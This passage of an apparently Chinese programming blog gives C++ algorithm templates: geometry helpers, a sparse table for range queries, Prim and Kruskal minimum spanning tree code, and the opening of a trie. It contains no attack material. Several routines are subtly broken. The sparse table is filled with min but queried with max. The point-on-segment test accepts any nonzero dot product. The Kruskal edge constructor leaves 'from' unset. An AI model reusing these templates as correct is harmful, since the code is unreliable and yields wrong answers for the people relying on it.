class="token comment">//  两向量的点乘</span>db <span class="token function">Dot</span><span class="token punctuation">(</span>Vec A<span class="token punctuation">,</span>Vec B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> A<span class="token punctuation">.</span>x <span class="token operator">*</span> B<span class="token punctuation">.</span>x <span class="token operator">+</span> A<span class="token punctuation">.</span>y <span class="token operator">*</span> B<span class="token punctuation">.</span>y<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//向量长度</span>db <span class="token function">Length</span><span class="token punctuation">(</span>Vec A<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token function">Dot</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> A<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//向量角度</span>db <span class="token function">angle</span><span class="token punctuation">(</span>Vec A<span class="token punctuation">,</span>Vec B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">acos</span><span class="token punctuation">(</span><span class="token function">Dot</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> B<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">Length</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">Length</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//求向量的单位法线(A不能是零向量)</span>Vec <span class="token function">Normal</span><span class="token punctuation">(</span>Vec A<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>db L <span class="token operator">=</span> <span class="token function">Length</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">Vec</span><span class="token punctuation">(</span><span class="token operator">-</span>A<span class="token punctuation">.</span>y <span class="token operator">/</span> L<span class="token punctuation">,</span> A<span class="token punctuation">.</span>x <span class="token operator">/</span> L<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//求向量旋转 , 逆时针旋转角度rad</span>Vec <span class="token function">Rotate</span><span class="token punctuation">(</span>Vec A<span class="token punctuation">,</span>db rad<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">Vec</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>x <span class="token operator">*</span> <span class="token function">cos</span><span class="token punctuation">(</span>rad<span class="token punctuation">)</span> <span class="token operator">-</span> A<span class="token punctuation">.</span>y <span class="token operator">*</span> <span class="token function">sin</span><span class="token punctuation">(</span>rad<span class="token punctuation">)</span><span class="token punctuation">,</span> A<span class="token punctuation">.</span>x <span class="token operator">*</span> <span class="token function">sin</span><span class="token punctuation">(</span>rad<span class="token punctuation">)</span> <span class="token operator">+</span> A<span class="token punctuation">.</span>y <span class="token operator">*</span> <span class="token function">cos</span><span class="token punctuation">(</span>rad<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//求点到直线的距离</span>db <span class="token function">dis_dot_Line</span><span class="token punctuation">(</span>Point P<span class="token punctuation">,</span>Point A<span class="token punctuation">,</span>Point B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Vec v1 <span class="token operator">=</span> B <span class="token operator">-</span> A<span class="token punctuation">,</span> v2 <span class="token operator">=</span> P <span class="token operator">-</span> A<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">Cross</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> v2<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">Length</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//求点到直线的投影</span>Point <span class="token function">GetLineProjection</span><span class="token punctuation">(</span>Point P<span class="token punctuation">,</span>Point A <span class="token punctuation">,</span>Point B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Vec v <span class="token operator">=</span> B <span class="token operator">-</span> A<span class="token punctuation">;</span>    <span class="token keyword">return</span> A <span class="token operator">+</span> v <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token function">Dot</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> P <span class="token operator">-</span> A<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">Dot</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//线段相交  (规范相交)</span><span class="token keyword">bool</span> <span class="token function">SegmentIntersection</span><span class="token punctuation">(</span>Point A1<span class="token punctuation">,</span>Point A2<span class="token punctuation">,</span>Point B1<span class="token punctuation">,</span>Point B2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    db c1 <span class="token operator">=</span> <span class="token function">Cross</span><span class="token punctuation">(</span>A2 <span class="token operator">-</span> A1<span class="token punctuation">,</span> B1 <span class="token operator">-</span> A1<span class="token punctuation">)</span><span class="token punctuation">,</span> c2 <span class="token operator">=</span> <span class="token function">Cross</span><span class="token punctuation">(</span>A2 <span class="token operator">-</span> A1<span class="token punctuation">,</span> B2 <span class="token operator">-</span> A1<span class="token punctuation">)</span><span class="token punctuation">;</span>    db c3 <span class="token operator">=</span> <span class="token function">Cross</span><span class="token punctuation">(</span>B2 <span class="token operator">-</span> B1<span class="token punctuation">,</span> A1 <span class="token operator">-</span> B1<span class="token punctuation">)</span><span class="token punctuation">,</span> c4 <span class="token operator">=</span> <span class="token function">Cross</span><span class="token punctuation">(</span>B2 <span class="token operator">-</span> B1<span class="token punctuation">,</span> A2 <span class="token operator">-</span> B1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">sign</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">sign</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sign</span><span class="token punctuation">(</span>c3<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">sign</span><span class="token punctuation">(</span>c4<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//判断点是否在线段上（不包含端点）</span><span class="token keyword">bool</span> <span class="token function">onSegment</span><span class="token punctuation">(</span>Point p<span class="token punctuation">,</span>Point a1<span class="token punctuation">,</span>Point a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token function">Cross</span><span class="token punctuation">(</span>a1 <span class="token operator">-</span> p<span class="token punctuation">,</span> a2 <span class="token operator">-</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token function">Dot</span><span class="token punctuation">(</span>a1 <span class="token operator">-</span> p<span class="token punctuation">,</span> a2 <span class="token operator">-</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//点到线段的距离</span>db <span class="token function">distancetosegment</span><span class="token punctuation">(</span>Point P<span class="token punctuation">,</span>Point A<span class="token punctuation">,</span>Point B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>A<span class="token operator">==</span>B<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">Length</span><span class="token punctuation">(</span>P <span class="token operator">-</span> A<span class="token punctuation">)</span><span class="token punctuation">;</span>    Vec v1 <span class="token operator">=</span> B <span class="token operator">-</span> A<span class="token punctuation">,</span> v2 <span class="token operator">=</span> P <span class="token operator">-</span> A<span class="token punctuation">,</span> v3 <span class="token operator">=</span> P <span class="token operator">-</span> B<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token function">Dot</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0</span> <span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">Length</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token function">Dot</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span>v3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">Length</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> <span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">Cross</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">Length</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="8-RMQ-算法-ST表"><a href="#8-RMQ-算法-ST表" class="headerlink" title="8. RMQ 算法(ST表)"></a>8. RMQ 算法(ST表)</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* * st表 * st[i][j]表示元素arr[i]开始，长度为2^j区间内的最值 * st[i][0]为arr[i]，st[i][j] = max(st[i][j-1], st[i - (1 &lt;&lt; j-1)][j-1]) * 求区间[l, r]内最值： * Log[i]代表i的对数向下取整 * 对于长度len而言，显然2^log2[len]严格大于len的一半 * 令k = Log[r - l + 1]，则最值为max(st[l][k], st[r - (1&lt;&lt;k) + 1][k]) */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">maxn</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">55000</span><span class="token punctuation">)</span></span></span><span class="token keyword">int</span> Log<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> st<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">st_prepare</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     Log<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        Log<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>Log<span class="token punctuation">[</span>i<span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        st<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    st<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>j<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> j<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            st<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>st<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> st<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">st_query</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> r <span class="token operator">-</span> l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">=</span> Log<span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">max</span><span class="token punctuation">(</span>st<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> st<span class="token punctuation">[</span>r <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> k<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="9-最小生成树"><a href="#9-最小生成树" class="headerlink" title="9. 最小生成树"></a>9. 最小生成树</h3><h4 id="9-1-prime算法"><a href="#9-1-prime算法" class="headerlink" title="9.1 prime算法"></a>9.1 prime算法</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">edge</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> to <span class="token punctuation">;</span>    ll cost<span class="token punctuation">;</span>    <span class="token function">edge</span> <span class="token punctuation">(</span><span class="token keyword">int</span> tt<span class="token punctuation">,</span><span class="token keyword">int</span> cc<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token function">to</span><span class="token punctuation">(</span>tt<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">cost</span><span class="token punctuation">(</span>cc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token function">edge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token keyword">operator</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token keyword">const</span> edge <span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token keyword">const</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> a<span class="token punctuation">.</span>cost <span class="token operator">&lt;</span>cost<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>priority_queue<span class="token operator">&lt;</span>edge<span class="token operator">></span> que<span class="token punctuation">;</span>vector <span class="token operator">&lt;</span>edge<span class="token operator">></span> G<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">bool</span> vis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>ll <span class="token function">prime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ll res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>G<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        que<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>G<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    vis<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>que<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        edge e<span class="token operator">=</span>que<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        que<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>vis<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        vis<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>        res<span class="token operator">+=</span>e<span class="token punctuation">.</span>cost<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>G<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            que<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>G<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="9-2-kruscal-算法"><a href="#9-2-kruscal-算法" class="headerlink" title="9.2 kruscal 算法"></a>9.2 kruscal 算法</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">edge</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> from<span class="token punctuation">,</span>to<span class="token punctuation">;</span>    ll cost<span class="token punctuation">;</span>    <span class="token function">edge</span><span class="token punctuation">(</span><span class="token keyword">int</span> tt<span class="token punctuation">,</span>ll cst<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token function">to</span><span class="token punctuation">(</span>tt<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">cost</span><span class="token punctuation">(</span>cst<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token function">edge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>G<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">bool</span> <span class="token function">cmp</span><span class="token punctuation">(</span>edge a<span class="token punctuation">,</span>edge b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> a<span class="token punctuation">.</span>cost<span class="token operator">&lt;</span>b<span class="token punctuation">.</span>cost<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>      fa<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">find_f</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">==</span>fa<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">return</span> x<span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> x<span class="token operator">=</span><span class="token function">find_f</span><span class="token punctuation">(</span>fa<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">bool</span> <span class="token function">same</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">find_f</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">find_f</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">unio</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> u<span class="token operator">=</span><span class="token function">find_f</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span>v<span class="token operator">=</span><span class="token function">find_f</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>u<span class="token operator">==</span>v<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        fa<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token operator">=</span>v<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ll <span class="token function">kruscal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ll res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">sort</span><span class="token punctuation">(</span>G<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>G<span class="token operator">+</span><span class="token number">1</span><span class="token operator">+</span>n<span class="token punctuation">,</span>cmp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">same</span><span class="token punctuation">(</span>G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>from<span class="token punctuation">,</span>G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">unio</span><span class="token punctuation">(</span>G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>from<span class="token punctuation">,</span>G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">)</span><span class="token punctuation">;</span>            res<span class="token operator">+=</span>G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>cost<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="10-trie树"><a href="#10-trie树" class="headerlink" title="10. trie树"></a>10. trie树</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">Trie</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> next<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ed<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> L<span class="token punctuation">,</span> root<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            next<span class="token punctuation">[</span>L<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        ed<span class="token punctuation">[</span>L<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> L<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        L <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        root <span class="token operator">=</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> now <span class="token operator">=</span> root<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> sz <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>                next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            now <span class="token operator">=</span> next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        ed<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> now <span class="token operator">=</span> root<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span 